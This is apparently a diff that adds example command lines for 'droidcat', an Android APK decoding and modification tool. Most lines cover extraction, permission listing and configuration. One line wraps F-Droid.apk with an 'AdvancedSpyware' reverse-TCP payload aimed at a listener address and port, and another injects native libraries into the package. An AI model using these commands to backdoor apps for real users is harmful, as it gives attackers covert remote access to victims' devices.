@@ -1,0 +1,31 @@
+$droidcat -in "F-Droid.apk,GCamBrasil.apk" -mode-by-name="DECODE" -casper3-options="res=yes, dex=no"
+
+$droidcat -in "F-Droid.apk, LineageOS-2020-miatoll.zip" -select-by-name="Lineage" -script="extract.dsc" -output-dir=%CONF_OUTPUT_DIR
+
+$droidcat -in F-Droid.apk -structure-model="APKTOOL" -script=decode.dsc -output="fdroid" -max-thread=6 -max-host-memory=2Mb
+
+$droidcat -in F-Droid.apk -structure-model="APKTOOL" -script=decode.dsc -output-in-memory -max-thread=6 -max-host-memory=22Mb -perform-operation="%copy% some_file.txt $output:lib/$arch:armv8a/"
+
+$droidcat -in F-Droid.apk -m 2 -use-techniques="AdvancedSpyware" -aspy-type="Reverse TCP" -aspy-options="LPORT=444; LHOST=10.0.0.110" -display-file-info -display-api-name -display-package-name -display-required-permissions
+
+$droidcat -in F-Droid.apk -check-everything -test-for-antifeatures -max-heap=200Mb -max-cpu-usage=30 F-Droid.apk
+
+$droidcat -in F-Droid.apk -package-aliasing -execute="echo 'Everything is ok!'"
+
+$droidcat -display-required-permissions -daemon F-Droid.apk
+
+$droidcat -script="extract.ds" -execute="echo 'F-Droid has been extracted!'" -progress-mode="elaborate" F-Droid.apk
+
+$droidcat -use-techniques="PluginInjector" -in-list="[libdroid.so, libmake.so, libsomething.so]" -in F-Droid.apk -target-package-arch=x86
+
+$droidcat -use-techniques="UnitUnpacker" main.43242113.com.beloncode.mygame.obb
+
+$droidcat -interactive
+
+$droidcat -continue
+$droidcat -clean-cache-entries
+$droidcat -delete-history
+
+$droidcat -set-config="main:use_max_cpu=false"
+$droidcat -help
+$droidcat -daemon -reject-UDP -port=30000
